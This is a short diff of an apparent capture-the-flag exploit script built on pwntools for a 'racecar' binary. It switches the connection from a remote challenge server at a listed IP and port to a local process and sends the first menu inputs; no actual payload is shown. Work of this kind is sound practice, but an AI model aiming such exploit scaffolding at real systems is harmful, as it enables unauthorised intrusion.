@@ -4,8 +4,8 @@ from pwnlib.elf import char
 
 
 def exploit(payload: str):
-	#conn = process('./racecar')
-	conn = remote('209.97.134.177', 30985)
+	conn = pwn.process('./racecar')
+	#conn = remote('209.97.134.177', 30985)
 	conn.sendlineafter(b'Name', b'a')
 	conn.sendlineafter(b'Nickname', b'a')
 	conn.sendlineafter(b'selection', b'2')
